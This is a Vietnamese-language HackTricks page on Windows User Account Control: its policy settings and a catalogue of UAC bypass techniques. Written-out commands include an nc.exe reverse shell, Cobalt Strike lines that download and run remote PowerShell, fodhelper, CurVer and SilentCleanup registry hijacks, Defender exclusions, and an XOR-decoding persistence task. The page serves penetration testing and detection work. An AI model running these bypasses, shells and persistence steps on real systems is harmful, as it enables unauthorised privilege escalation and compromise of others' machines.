# UAC - User Account Control

{{#include ../../banners/hacktricks-training.md}}

## UAC

[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) là một tính năng cho phép **hiển thị lời nhắc xác nhận khi thực hiện các hoạt động cần quyền nâng cao**. Các ứng dụng có những mức `integrity` khác nhau, và chương trình có **mức cao** có thể thực hiện những tác vụ **có khả năng làm tổn hại hệ thống**. Khi bật UAC, các ứng dụng và tác vụ luôn **chạy trong ngữ cảnh bảo mật của tài khoản không phải quản trị viên**, trừ khi quản trị viên cấp quyền rõ ràng cho các ứng dụng/tác vụ đó để chạy với quyền truy cập cấp quản trị viên vào hệ thống. Đây là một tính năng tiện lợi giúp bảo vệ quản trị viên khỏi những thay đổi ngoài ý muốn, nhưng không được xem là ranh giới bảo mật.<sup>[[2]](#references)</sup>

Để biết thêm thông tin về các mức integrity:


{{#ref}}
../windows-local-privilege-escalation/integrity-levels.md
{{#endref}}

Khi UAC được bật, người dùng quản trị viên được cấp 2 token: một token người dùng tiêu chuẩn để thực hiện các thao tác thông thường ở mức integrity trung bình, và một token có quyền quản trị viên.

[Trang này](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) giải thích chi tiết cách UAC hoạt động, bao gồm quy trình đăng nhập, trải nghiệm người dùng và kiến trúc UAC.<sup>[[2]](#references)</sup> Quản trị viên có thể sử dụng các chính sách bảo mật để cấu hình cách UAC hoạt động cho tổ chức của mình ở cấp cục bộ (bằng secpol.msc), hoặc cấu hình và triển khai thông qua Group Policy Objects (GPO) trong môi trường miền Active Directory. Các cài đặt khác nhau được trình bày chi tiết [tại đây](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings). Có 10 cài đặt Group Policy có thể được thiết lập cho UAC. Bảng sau cung cấp thêm chi tiết:

| Cài đặt Group Policy                                                                                                                                                                                                                                                                                                                                                           | Khóa Registry                | Cài đặt mặc định                                              |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | --------------------------- | ------------------------------------------------------------ |
| [User Account Control: Chế độ phê duyệt của quản trị viên cho tài khoản Administrator tích hợp](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-admin-approval-mode-for-the-built-in-administrator-account)                                                                                                           | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\FilterAdministratorToken`   | `0` (Đã tắt)                                             |
| [User Account Control: Cách hiển thị lời nhắc nâng quyền cho quản trị viên trong Chế độ phê duyệt của quản trị viên](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-behavior-of-the-elevation-prompt-for-administrators-in-admin-approval-mode)                                                                     | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin` | `5` (Yêu cầu xác nhận đối với các tệp nhị phân không thuộc Windows trên secure desktop) |
| [User Account Control: Cách hiển thị lời nhắc nâng quyền cho người dùng tiêu chuẩn](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-behavior-of-the-elevation-prompt-for-standard-users)                                                                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorUser`  | `1` (Yêu cầu thông tin xác thực trên secure desktop)         |
| [User Account Control: Phát hiện cài đặt ứng dụng và yêu cầu nâng quyền](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-detect-application-installations-and-prompt-for-elevation)                                                                                                 | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableInstallerDetection`   | `1` (Đã bật; mặc định bị tắt trên Enterprise)           |
| [User Account Control: Chỉ nâng quyền cho các tệp thực thi được ký và xác thực](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-only-elevate-executables-that-are-signed-and-validated)                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ValidateAdminCodeSignatures` | `0` (Đã tắt)                                             |
| [User Account Control: Chỉ nâng quyền cho các ứng dụng UIAccess được cài đặt ở vị trí an toàn](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-only-elevate-uiaccess-applications-that-are-installed-in-secure-locations)                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableSecureUIAPaths`       | `1` (Đã bật)                                              |
| [User Account Control: Chạy tất cả quản trị viên trong Chế độ phê duyệt của quản trị viên](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-run-all-administrators-in-admin-approval-mode)                                                                                                                            | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableLUA`                  | `1` (Đã bật)                                              |
| [User Account Control: Cho phép các ứng dụng UIAccess yêu cầu nâng quyền mà không sử dụng secure desktop](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-allow-uiaccess-applications-to-prompt-for-elevation-without-using-the-secure-desktop)                                   | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableUIADesktopToggle`     | `0` (Đã tắt)                                             |
| [User Account Control: Chuyển sang secure desktop khi yêu cầu nâng quyền](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-switch-to-the-secure-desktop-when-prompting-for-elevation)                                                                               | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\PromptOnSecureDesktop`      | `1` (Đã bật)                                              |
| [User Account Control: Ảo hóa các lỗi ghi tệp và Registry sang vị trí riêng của từng người dùng](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-virtualize-file-and-registry-write-failures-to-per-user-locations)                                                                     | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableVirtualization`       | `1` (Đã bật)                                              |

### Chính sách cài đặt phần mềm trên Windows

Theo mặc định, **chính sách bảo mật cục bộ** ("secpol.msc" trên hầu hết các hệ thống) được cấu hình để **ngăn người dùng không phải quản trị viên cài đặt phần mềm**. Điều này có nghĩa là ngay cả khi người dùng không phải quản trị viên tải được trình cài đặt phần mềm của bạn, họ cũng không thể chạy trình cài đặt đó nếu không có tài khoản quản trị viên.

### Khóa Registry buộc UAC yêu cầu nâng quyền

Với tư cách người dùng tiêu chuẩn không có quyền quản trị viên, bạn có thể đảm bảo tài khoản "tiêu chuẩn" được **UAC yêu cầu cung cấp thông tin xác thực** khi cố thực hiện một số thao tác nhất định. Thao tác này cần sửa đổi một số **khóa Registry**, việc đó đòi hỏi quyền quản trị viên, trừ khi có **UAC bypass** hoặc kẻ tấn công đã đăng nhập với quyền quản trị viên.

Ngay cả khi người dùng thuộc nhóm **Administrators**, những thay đổi này vẫn buộc người dùng **nhập lại thông tin xác thực tài khoản** để thực hiện các thao tác quản trị.

**Trên thực tế, việc này chỉ hữu ích khi bạn đã có token được nâng quyền, UAC bypass hoặc một cấu hình sai cho phép thay đổi các khóa này; nếu không, thao tác ghi vào Registry sẽ bị chặn.**

Các khóa và mục Registry cần thay đổi như sau (giá trị mặc định nằm trong ngoặc đơn):

- `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System`:
  - `ConsentPromptBehaviorUser` = 1 (3)
  - `ConsentPromptBehaviorAdmin` = 1 (5)
  - `PromptOnSecureDesktop` = 1 (1)

Bạn cũng có thể thực hiện việc này thủ công bằng công cụ Local Security Policy. Sau khi thay đổi, các thao tác quản trị sẽ yêu cầu người dùng nhập lại thông tin xác thực.

### Lưu ý

**User Account Control không phải là ranh giới bảo mật.** Do đó, người dùng tiêu chuẩn không thể thoát khỏi tài khoản của mình và có được quyền quản trị viên nếu không có khai thác nâng quyền cục bộ.

### Yêu cầu người dùng cấp 'quyền truy cập toàn bộ máy tính'

```powershell
hostname | Set-Clipboard
Enable-PSRemoting -SkipNetworkProfileCheck -Force

cd C:\Users\hacedorderanas\Desktop
New-PSSession -Name "Case ID: 1527846" -ComputerName hostname
Enter-PSSession -ComputerName hostname
```

### Quyền UAC

- Internet Explorer Protected Mode sử dụng các kiểm tra mức toàn vẹn để ngăn các tiến trình có mức toàn vẹn cao (như trình duyệt web) truy cập dữ liệu có mức toàn vẹn thấp (như thư mục Temporary Internet Files). Việc này được thực hiện bằng cách chạy trình duyệt với token có mức toàn vẹn thấp. Khi trình duyệt cố truy cập dữ liệu được lưu trong vùng có mức toàn vẹn thấp, hệ điều hành sẽ kiểm tra mức toàn vẹn của tiến trình và cho phép truy cập tương ứng. Tính năng này giúp ngăn các cuộc tấn công remote code execution truy cập dữ liệu nhạy cảm trên hệ thống.
- Khi người dùng đăng nhập vào Windows, hệ thống tạo một access token chứa danh sách quyền của người dùng. Quyền được định nghĩa là sự kết hợp giữa các quyền hạn và năng lực của người dùng. Token cũng chứa danh sách thông tin xác thực của người dùng, được dùng để xác thực người dùng với máy tính và các tài nguyên trên mạng.

### Autoadminlogon

Để cấu hình Windows tự động đăng nhập một người dùng cụ thể khi khởi động, hãy đặt **registry key `AutoAdminLogon`**. Việc này hữu ích trong môi trường kiosk hoặc cho mục đích kiểm thử. Chỉ sử dụng thiết lập này trên các hệ thống an toàn, vì mật khẩu sẽ bị lộ trong registry.

Đặt các key sau bằng Registry Editor hoặc `reg add`:

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`:
  - `AutoAdminLogon` = 1
  - `DefaultUsername` = username
  - `DefaultPassword` = password

Để khôi phục hành vi đăng nhập thông thường, đặt `AutoAdminLogon` thành 0.

## UAC bypass

> [!TIP]
> Lưu ý rằng nếu bạn có quyền truy cập đồ họa vào máy nạn nhân, UAC bypass rất đơn giản vì bạn chỉ cần nhấp vào "Yes" khi lời nhắc UAC xuất hiện

UAC bypass cần thiết trong tình huống sau: **UAC đang được bật, tiến trình của bạn đang chạy trong ngữ cảnh có mức toàn vẹn trung bình và người dùng của bạn thuộc nhóm administrators**.

Điều quan trọng cần đề cập là **UAC bypass khó hơn nhiều nếu UAC đang ở mức bảo mật cao nhất (Always) so với khi ở bất kỳ mức nào khác (Default).**

### Phân loại nhanh từ shell có mức toàn vẹn trung bình

Trước khi thử bypass, hãy xác nhận bạn đang ở đúng tình huống và đối chiếu build của máy với các phương pháp đã biết là hoạt động:

```powershell
whoami /groups
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v PromptOnSecureDesktop
powershell -c "Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion' | select ProductName,DisplayVersion,CurrentBuild,UBR"
schtasks /Query /TN "\Microsoft\Windows\DiskCleanup\SilentCleanup"
```

Ghi chú thực tế:
- Nếu `EnableLUA=0`, bạn không cần bypass: bất kỳ admin token nào cũng có thể yêu cầu high integrity trực tiếp.
- `ConsentPromptBehaviorAdmin=2` hoặc `5` là tình huống phổ biến đối với auto-elevate / COM-based bypasses.
- `Always Notify` nâng mức bảo vệ, nhưng bạn vẫn nên kiểm tra chính xác build thay vì mặc định rằng phương pháp sẽ thất bại: UACME vẫn theo dõi một số phương pháp `AlwaysNotify compatible` trên các build Windows hiện đại.<sup>[[3]](#references)</sup>

### UAC bị tắt

Nếu UAC đã bị tắt (`ConsentPromptBehaviorAdmin` là **`0`**), bạn có thể **thực thi reverse shell với quyền admin** (mức toàn vẹn cao) bằng cách dùng một lệnh như:

```bash
#Put your reverse shell instead of "calc.exe"
Start-Process powershell -Verb runAs "calc.exe"
Start-Process powershell -Verb runAs "C:\Windows\Temp\nc.exe -e powershell 10.10.14.7 4444"
```

#### UAC bypass bằng token duplication

- [https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/](https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/)
- [https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html](https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html)

### Local RPC + reusable debug object

Giao diện local RPC của AppInfo `201ef99a-7fa0-444c-9399-19ba84f12a1a` có thể tạo process với debugging được bật. Các process được tạo ở chế độ debug trên cùng một thread sẽ dùng chung debug object của thread; một sự kiện debug khi tạo process sẽ mang theo process handle có toàn quyền truy cập, ngay cả khi kết quả RPC chỉ cấp quyền truy cập hạn chế. Điều này biến việc tái sử dụng debug object thành một primitive UAC cho thành viên nhóm Administrators có mức integrity trung bình.<sup>[[11]](#references)[[12]](#references)</sup>

Một chuỗi thao tác thực tế gồm:<sup>[[11]](#references)[[12]](#references)</sup>

1. Gọi phương thức local RPC (trực tiếp hoặc thông qua `NdrAsyncClientCall`) để tạo một process hy sinh không được nâng quyền, với debugging được bật.
2. Dùng `NtQueryInformationProcess` truy vấn `ProcessDebugObjectHandle`, tách nó bằng `NtRemoveProcessDebug`, giữ lại object rồi chấm dứt process hy sinh.
3. Dùng cùng giao diện RPC để tạo một process auto-elevated đáng tin cậy, sau đó liên kết object đã lưu với thread đang gọi thông qua `DbgUiSetThreadDebugObject`.
4. Gọi `WaitForDebugEvent` và lấy process handle từ `CREATE_PROCESS_DEBUG_EVENT`; nhân đôi handle đó bằng `NtDuplicateObject` trước khi tiếp tục.
5. Cung cấp handle đã nhân đôi cho `UpdateProcThreadAttribute(PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, ...)` rồi khởi chạy payload bằng cấu trúc startup-info mở rộng. Cách này vừa tái sử dụng ngữ cảnh của process đã nâng quyền, vừa giúp process con có quan hệ parent trông đáng tin cậy.

Hãy tìm chuỗi thao tác ngắn này thay vì chỉ tìm binary auto-elevated: tạo process qua local AppInfo RPC, truy vấn `ProcessDebugObjectHandle`, detach/reattach debugger, sự kiện debug khi tạo process xảy ra ngay sau đó, nhân đôi handle, và process con có parent được ghi nhận không khớp với process đã gọi các API tạo process.<sup>[[12]](#references)</sup>

### UAC "bypass" rất cơ bản (toàn quyền truy cập file system)

Nếu bạn có shell bằng user thuộc nhóm Administrators, bạn có thể **mount share C$** qua SMB (file system) cục bộ thành một ổ đĩa mới, rồi **truy cập mọi thứ bên trong file system** (kể cả thư mục home của Administrator).

> [!WARNING]
> **Có vẻ như thủ thuật này không còn hoạt động nữa**

```bash
net use Z: \\127.0.0.1\c$
cd C$

#Or you could just access it:
dir \\127.0.0.1\c$\Users\Administrator\Desktop
```

### UAC bypass bằng Cobalt Strike

Các kỹ thuật của Cobalt Strike chỉ hoạt động nếu UAC không được đặt ở mức bảo mật cao nhất.

```bash
# UAC bypass via token duplication
elevate uac-token-duplication [listener_name]
# UAC bypass via service
elevate svc-exe [listener_name]

# Bypass UAC with Token Duplication
runasadmin uac-token-duplication powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
# Bypass UAC with CMSTPLUA COM interface
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
```

**Empire** và **Metasploit** cũng có một số module để **bypass** **UAC**.

### Các giao diện COM được tự động nâng quyền (`ICMLuaUtil` / `CMSTPLUA`)

Các đối tượng COM được tự động nâng quyền vẫn là một bề mặt UAC thực tiễn trên các bản build hiện đại. UACME vẫn ghi nhận `ICMLuaUtil` hoạt động trên các nhánh Windows hiện tại, còn các công cụ offensive tiếp tục thích ứng với `CMSTPLUA` bằng cách kết hợp một tiến trình trên desktop tương tác, thực thi 64-bit và đôi khi giả mạo PEB/tiến trình trước khi gọi COM Elevation Moniker.<sup>[[3]](#references)</sup>

Mẹo thực tế:
- Ưu tiên tiến trình **64-bit** trong **interactive session** của người dùng (thường là `explorer.exe` hoặc tiến trình con của nó).
- Nếu raw shell không hoạt động, hãy thử lại từ một triển khai BOF / UACME thay vì dùng một wrapper `CreateProcess` đơn giản.
- Tiến trình con thường sẽ chạy trong một **tiến trình được nâng quyền riêng biệt**; nhiều BOF không nâng quyền trực tiếp cho beacon hiện tại.

### KRBUACBypass

Tài liệu và công cụ tại [https://github.com/wh0amitz/KRBUACBypass](https://github.com/wh0amitz/KRBUACBypass)

### Các khai thác bypass UAC

[**UACME**](https://github.com/hfiref0x/UACME) là một tập hợp các kỹ thuật bypass UAC. Hãy biên dịch bằng Visual Studio hoặc MSBuild; quá trình build tạo ra một số tệp thực thi (ví dụ: `Source\Akagi\output\x64\Debug\Akagi.exe`), vì vậy hãy chọn phương thức phù hợp với bản build mục tiêu.<sup>[[3]](#references)</sup>\
Cẩn thận: một số phương thức bypass khởi chạy chương trình hiển thị hoặc lời nhắc có thể khiến người dùng chú ý.<sup>[[3]](#references)</sup>

UACME có **phiên bản build mà mỗi kỹ thuật bắt đầu hoạt động**.<sup>[[3]](#references)</sup> Bạn có thể tìm kiếm kỹ thuật ảnh hưởng đến các phiên bản của mình:

```powershell
PS C:\> [environment]::OSVersion.Version

Major  Minor  Build  Revision
-----  -----  -----  --------
10     0      14393  0
```

Ngoài ra, sử dụng [trang này](https://en.wikipedia.org/wiki/Windows_10_version_history) để xác định bản phát hành Windows `1607` từ số phiên bản build.

Một quy trình thực tế là trước tiên **đánh giá build của host**, sau đó mới chạy phương pháp tương ứng:

```cmd
python main.py --scan uac
Akagi64.exe 33 C:\Windows\System32\cmd.exe
```

- `WinPwnage` nhanh chóng so sánh build cục bộ với các phương thức UAC đã biết, rất hữu ích để nhanh chóng loại bỏ các PoC không còn hoạt động.<sup>[[4]](#references)</sup>
- `UACME` vẫn là catalogue công khai tốt nhất để xác định một bypass áp dụng cho build cụ thể nào. Phiên bản 3.7.1 bổ sung các phương thức 83–85, còn bản phát hành trước đó đã kiểm thử lại các phương thức hiện có trên **Windows 11 25H2**; hãy kiểm tra lại bảng phương thức và ghi chú phát hành thay vì cho rằng PoC cũ vẫn áp dụng nguyên trạng.<sup>[[3]](#references)[[9]](#references)</sup>

### Các chuỗi WNF/UIAccess tương thích với Always Notify (UACME 3.7.1)

`Always Notify` không loại bỏ mọi UAC bypass. UACME 3.7.1 triển khai ba phương thức x64 mới, kết hợp trạng thái môi trường/giao thức do người dùng kiểm soát với hành vi của scheduled task hoặc UIAccess đã nâng quyền, và đánh dấu tất cả là `AlwaysNotify compatible`:<sup>[[3]](#references)[[9]](#references)</sup>

- **83 — UnifiedConsent:** chuyển hướng `SystemRoot` để tác vụ WNF `\Microsoft\Windows\ConsentUX\UnifiedConsent\UnifiedConsentSyncTask` khiến `taskhostw.exe` chạy với quyền nâng cao side-load `unifiedconsent.dll`. UACME theo dõi phương thức này từ Windows 10 build 19041.
- **84 — TabTip:** dùng cùng primitive biến môi trường đó với UIAccess `TabTip.exe`, tiến trình này tải `windows.storage.dll`, `ApplicationTargetedFeatureDatabase.dll` hoặc `rsaenh.dll` tùy theo build, sau đó chuyển sang khai thác ngữ cảnh UIAccess có mức toàn vẹn cao tạo ra. UACME theo dõi phương thức này từ Windows 8.1 / Server 2016.
- **85 — Narrator:** chiếm quyền giao thức `feedback-hub` theo từng người dùng, điều khiển Narrator bằng `Alt+CapsLock+F`, rồi khởi chạy bản sao `osk.exe` có thể ghi, tiến trình này side-load `OskSupport.dll`. Phương thức này yêu cầu desktop tương tác và được theo dõi từ Windows 10 1809 / Server 2019.

Sau khi tạo các payload unit và Akagi theo tài liệu của UACME, hãy gọi số phương thức tương ứng (lệnh tùy chọn mặc định là `cmd.exe`):

```cmd
Akagi64.exe 83 C:\Windows\System32\cmd.exe
Akagi64.exe 84 C:\Windows\System32\cmd.exe
Akagi64.exe 85 C:\Windows\System32\cmd.exe
```

Phương pháp 84 và 85 phụ thuộc vào UIAccess/tương tác với desktop, vì vậy đừng kỳ vọng chúng hoạt động nguyên trạng từ Session 0 hoặc shell dịch vụ không tương tác. Cả ba đều thay đổi trạng thái môi trường/giao thức và đặt các DLL; hãy kiểm tra implementation và xóa các artifact đó sau khi thử nghiệm.<sup>[[3]](#references)[[9]](#references)</sup>

### UAC Bypass – fodhelper.exe (Registry hijack)

Binary đáng tin cậy `fodhelper.exe` được tự động nâng quyền trên các phiên bản Windows hiện đại. Khi được khởi chạy, nó truy vấn đường dẫn registry theo người dùng bên dưới mà không xác thực verb `DelegateExecute`. Đặt một command tại đó cho phép tiến trình Medium Integrity (người dùng thuộc nhóm Administrators) tạo một tiến trình High Integrity mà không hiện lời nhắc UAC.

Đường dẫn registry được fodhelper truy vấn:
```text
HKCU\Software\Classes\ms-settings\Shell\Open\command
```

<details>
<summary>Các bước PowerShell (đặt payload của bạn, rồi kích hoạt)</summary>

```powershell
# Optional: from a 32-bit shell on 64-bit Windows, spawn a 64-bit PowerShell for stability
C:\\Windows\\sysnative\\WindowsPowerShell\\v1.0\\powershell -nop -w hidden -c "$PSVersionTable.PSEdition"

# 1) Create the vulnerable key and values
New-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force | Out-Null

# 2) Set default command to your payload (example: reverse shell or cmd)
# Replace <BASE64_PS> with your base64-encoded PowerShell (or any command)
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -e <BASE64_PS>" -Force

# 3) Trigger auto-elevation
Start-Process -FilePath "C:\\Windows\\System32\\fodhelper.exe"

# 4) (Recommended) Cleanup
Remove-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open" -Recurse -Force
```

</details>
Lưu ý:
- Hoạt động khi người dùng hiện tại là thành viên của Administrators và mức UAC là mặc định/nới lỏng (không phải Always Notify với các hạn chế bổ sung).
- Dùng đường dẫn `sysnative` để khởi chạy PowerShell 64-bit từ một tiến trình 32-bit trên Windows 64-bit.
- Payload có thể là bất kỳ lệnh nào (PowerShell, cmd hoặc đường dẫn EXE). Tránh các giao diện nhắc xác nhận để tăng tính ẩn mình.

#### Kích hoạt `ComputerDefaults.exe` cho cùng handler `ms-settings`

`ComputerDefaults.exe` phân giải cùng liên kết `ms-settings\Shell\Open\command` theo từng người dùng như `fodhelper.exe`.<sup>[[13]](#references)[[14]](#references)</sup> Sau khi đặt lệnh mặc định và giá trị `DelegateExecute` rỗng như trên, dùng `Start-Process "$env:WINDIR\System32\ComputerDefaults.exe"` làm phương thức kích hoạt thay thế; không lặp lại bước thiết lập registry.<sup>[[13]](#references)[[14]](#references)</sup> Các điều kiện tiên quyết về administrator có medium-integrity và chính sách UAC trong ghi chú `fodhelper.exe` ở trên vẫn áp dụng.<sup>[[2]](#references)[[3]](#references)</sup> UACME liệt kê trigger này từ Windows 10 RS4 (build 17134), vì vậy hãy xác minh trên build mục tiêu.<sup>[[3]](#references)</sup>

#### Biến thể CurVer/extension hijack (chỉ HKCU)

Các mẫu gần đây lạm dụng `fodhelper.exe` tránh dùng `DelegateExecute` và thay vào đó **chuyển hướng ProgID `ms-settings`** thông qua giá trị `CurVer` theo từng người dùng. Binary tự động nâng quyền vẫn phân giải handler trong `HKCU`, vì vậy không cần admin token để tạo các key:<sup>[[5]](#references)</sup>

```powershell
# Point ms-settings to a custom extension (.thm) and map that extension to our payload
New-Item -Path "HKCU:\Software\Classes\.thm\Shell\Open" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\.thm\Shell\Open\command" -Name "(default)" -Value "C:\\ProgramData\\rKXujm.exe" -Force | Out-Null
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings" -Name "CurVer" -Value ".thm" -Force

Start-Process "C:\\Windows\\System32\\fodhelper.exe"   # auto-elevates and runs rKXujm.exe
```

Sau khi được nâng quyền, malware thường **vô hiệu hóa các lời nhắc trong tương lai** bằng cách đặt `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin` thành `0`, rồi thực hiện thêm các hành vi né tránh phòng thủ (ví dụ: `Add-MpPreference -ExclusionPath C:\ProgramData`) và tạo lại cơ chế persistence để chạy với mức toàn vẹn cao. Một tác vụ persistence điển hình lưu **script PowerShell được mã hóa bằng XOR** trên đĩa, rồi giải mã và thực thi trong bộ nhớ mỗi giờ:<sup>[[5]](#references)</sup>

```powershell
schtasks /create /sc hourly /tn "OneDrive Startup Task" /rl highest /tr "cmd /c powershell -w hidden $d=[IO.File]::ReadAllBytes('C:\ProgramData\VljE\zVJs.ps1');$k=[Text.Encoding]::UTF8.GetBytes('Q');for($i=0;$i -lt $d.Length;$i++){$d[$i]=$d[$i]-bxor$k[$i%$k.Length]};iex ([Text.Encoding]::UTF8.GetString($d))"
```

Biến thể này vẫn dọn dropper và chỉ để lại các payload đã staging, khiến việc phát hiện phụ thuộc vào giám sát **`CurVer` hijack**, hành vi chỉnh sửa `ConsentPromptBehaviorAdmin`, việc tạo exclusion trong Defender hoặc các scheduled task giải mã PowerShell trong bộ nhớ.<sup>[[5]](#references)</sup>

### UAC bypass qua task `SilentCleanup` (`HKCU\Environment\windir`)

`SilentCleanup` khởi chạy `cleanmgr.exe` với quyền cao nhất và mở rộng `%windir%` từ môi trường người dùng. Nếu kiểm soát được `HKCU\Environment\windir`, bạn có thể chuyển hướng phần mở rộng đó đến một lệnh bất kỳ và đạt được integrity cao mà không cần hộp thoại xác nhận.<sup>[[8]](#references)</sup> Phương pháp này vẫn đáng để thử nghiệm trên các bản build gần đây vì UACME vẫn duy trì kỹ thuật này, và theo dõi issue gần đây cho thấy Windows 11 24H2 có thể chỉ cần điều chỉnh nhỏ về cách đặt dấu nháy.<sup>[[3]](#references)</sup>

```cmd
reg add "HKCU\Environment" /v windir /d "cmd.exe /c start powershell.exe" /f
schtasks /Run /TN "\Microsoft\Windows\DiskCleanup\SilentCleanup"
reg delete "HKCU\Environment" /v windir /f
```

Nếu tác vụ thêm dấu ngoặc kép vào đường dẫn trên bản dựng đó, hãy thử lại với payload kết thúc bằng dấu ngoặc kép (ví dụ: `cmd.exe"`). Luôn dọn dẹp `HKCU\Environment\windir` sau khi kiểm thử.

#### Thêm UAC bypass

Nhiều UAC bypass kinh điển khai thác luồng giao diện người dùng, COM object hoặc tương tác với desktop đòi hỏi **phiên tương tác đầy đủ** với nạn nhân; shell `nc.exe` thông thường hoặc một service chạy trong **Session 0** thường là chưa đủ.

Bạn thường có thể giải quyết việc này bằng phiên **meterpreter**. Migrate sang một **process** có giá trị **Session** bằng **1**:

![Trỏ ms-settings đến một extension tùy chỉnh (.thm) và ánh xạ extension đó tới payload của chúng ta - Thêm UAC bypass: Bạn có thể thực hiện việc này bằng phiên meterpreter. Migrate sang một process có Session...](<../../images/image (863).png>)

(_explorer.exe_ sẽ hoạt động)

### UAC Bypass with GUI

Nếu có quyền truy cập **GUI**, bạn chỉ cần chấp nhận lời nhắc UAC khi nó xuất hiện; thực ra bạn không cần bypass kỹ thuật. Vì vậy, có được một phiên GUI thường đã đủ để vượt qua trở ngại thực tế do UAC gây ra.

Hơn nữa, nếu bạn có được phiên GUI mà ai đó đang sử dụng (có thể qua RDP), sẽ có **một số công cụ đang chạy với quyền administrator** mà từ đó bạn có thể **chạy** trực tiếp một **cmd** chẳng hạn **với quyền admin** mà không bị UAC nhắc lại, như [**https://github.com/oski02/UAC-GUI-Bypass-appverif**](https://github.com/oski02/UAC-GUI-Bypass-appverif). Cách này có thể **stealthy** hơn một chút.

### Noisy brute-force UAC bypass

Nếu chấp nhận được việc gây nhiều tiếng ồn, một công cụ như [**ForceAdmin**](https://github.com/Chainski/ForceAdmin) có thể liên tục yêu cầu nâng quyền cho đến khi người dùng chấp nhận.

### Bypass của riêng bạn - Basic UAC bypass methodology

Nếu xem **UACME**, bạn sẽ thấy **nhiều UAC bypass khai thác DLL hijacking** (thường bằng cách khiến một binary có quyền elevated load DLL do attacker kiểm soát từ một đường dẫn có quyền ghi). [Đọc bài này để tìm hiểu cách tìm lỗ hổng DLL hijacking](../windows-local-privilege-escalation/dll-hijacking/index.html).

1. Tìm một binary có thể **autoelevate** (kiểm tra xem khi thực thi, nó có chạy ở mức toàn vẹn cao hay không).
2. Dùng procmon tìm các sự kiện "**NAME NOT FOUND**" có thể bị khai thác bằng **DLL Hijacking**.
3. Có thể bạn sẽ cần **ghi** DLL vào một số **đường dẫn được bảo vệ** (như `C:\Windows\System32`), nơi bạn không có quyền ghi. Bạn có thể bypass việc này bằng:
   1. **wusa.exe**: Windows 7, 8 và 8.1. Công cụ này cho phép giải nén nội dung của file CAB vào các đường dẫn được bảo vệ (vì công cụ chạy ở mức toàn vẹn cao).
   2. **IFileOperation**: Windows 10.
4. Chuẩn bị một **script** để sao chép DLL vào đường dẫn được bảo vệ rồi thực thi binary dễ bị tấn công và có thể autoelevate.

### Một kỹ thuật UAC bypass khác

Kỹ thuật này gồm việc theo dõi xem một **binary autoElevated** có cố **đọc** từ **registry** **tên/đường dẫn** của một **binary** hoặc **command** cần **thực thi** hay không (đặc biệt hữu ích nếu binary tìm thông tin này trong **HKCU**).

